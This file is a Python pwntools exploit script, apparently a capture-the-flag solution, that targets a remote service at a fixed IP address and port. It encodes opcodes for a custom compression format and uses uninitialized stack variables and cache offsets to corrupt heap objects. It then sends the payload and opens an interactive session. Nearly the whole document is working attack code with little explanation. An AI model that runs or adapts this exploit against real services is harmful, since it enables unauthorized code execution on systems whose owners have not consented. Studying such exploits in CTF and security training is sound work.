from pwn import *

context.log_level = 'debug'

p = remote('110.10.147.111', 4141)

magic = 0x393130322394D3C0
max_buf_offset_Q = 0x1000000000

payload = ''
payload += p64(magic)
payload += p64(max_buf_offset_Q)

"""
0: fm_to_comp_Q (uninitialized stack var)
1: cache_qword
2: save_zeros_to_comp_Q (uninitialized stack var)
3: save_cached_qword_to_comp
"""

def fm_to_comp_Q(Q_count, fm_data):  # send data to comp buf
    assert(Q_count >= 0 and Q_count <= 0x3f and Q_count * 8 == len(fm_data))
    local_payload = ''
    local_payload += chr((0 << 6) | Q_count)
    local_payload += fm_data
    return local_payload

def cache_qword(cache_idx, buf_inv_offset_Q):  # save data from comp buf to cache
    assert(cache_idx >= 0 and cache_idx <= 0x3f)
    local_payload = ''
    local_payload += chr((1 << 6) | cache_idx)
    local_payload += chr(buf_inv_offset_Q)
    return local_payload

def save_zeros_to_comp_Q(Q_count):  # save zeros to comp buf
    assert(Q_count >= 0 and Q_count <= 0x3f)
    local_payload = ''
    local_payload += chr((2 << 6) | Q_count)
    return local_payload

def save_cached_qword_to_comp(Q_count):  # save cache to comp
    assert(Q_count >= 0 and Q_count <= 0x3f)
    local_payload = ''
    local_payload += chr((3 << 6) | Q_count)
    return local_payload

payload += save_zeros_to_comp_Q(0x3f) * 10
payload += save_cached_qword_to_comp(0x34)
payload += cache_qword(0x33, 1)
payload += save_cached_qword_to_comp(0) * 56  # offset 0x1c0
payload += save_cached_qword_to_comp(0x33)
payload += cache_qword(0x34, 1)
payload += chr((0 << 6) | 0x3f)  # fail fm_to_comp_Q


"""
initial heap structure (lower is larger addr):
st_Compress 0x1B8
st_Compress::buf 0x8
st_FileManager 0x18
std::ifstream 0x208
"""

# final payload to send

payload = p32(len(payload)) + payload

p.send(payload)

p.interactive()
